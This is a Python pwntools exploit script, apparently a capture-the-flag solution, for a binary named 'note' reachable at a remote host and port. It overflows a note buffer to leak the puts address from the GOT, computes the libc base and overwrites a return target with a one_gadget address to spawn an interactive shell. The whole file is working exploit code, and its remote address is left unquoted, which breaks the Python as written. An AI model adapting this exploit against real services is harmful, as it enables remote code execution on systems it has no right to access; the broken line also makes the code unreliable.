#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import os
import sys

elfPath = "./note"
libcPath = "./libc.so.6"
remoteAddr = 47.89.18.224
remotePort = 10007

context.binary = elfPath
elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc

else:
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    else:
        io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)

context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG():
    #  base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
    info("edit -> {:#x}".format(0x400DB1))
    info("scanf -> {:#x}".format(0x400EB4))
    info("show -> {:#x}".format(0x400F01))
    info("printf -> {:#x}".format(0x400E9C))
    raw_input("DEBUG: ")

def edit(cont):
    io.sendlineafter("> ", "1")
    io.sendlineafter("Note:", cont)

def show():
    io.sendlineafter("> ", "2")

if __name__ == "__main__":
    io.sendlineafter("ID:", 'm4x')
    fmtarg = 0x401129
    edit(fit({168: [p64(fmtarg), elf.got['puts']]}, length = 256))
    #  show()
    DEBUG()
    io.sendlineafter("> ", p32(2) + p64(fmtarg) + p64(elf.got['puts']))
    #  libc.address = u64(io.recvuntil("\x7f")[-6:] + '\0\0') - libc.sym['puts']
    io.recvuntil("Note:")
    libc.address = u64(io.recvn(6) + '\0\0') - libc.sym['puts']
    success("libc", libc.address)
    pause()

    one_gadget = 0x4526a
    success("one_gadget", libc.address + one_gadget)
    payload = cyclic(length = 0x64, n = 8) + p64(libc.address + one_gadget)
    io.sendlineafter("> ", payload)

    io.interactive()
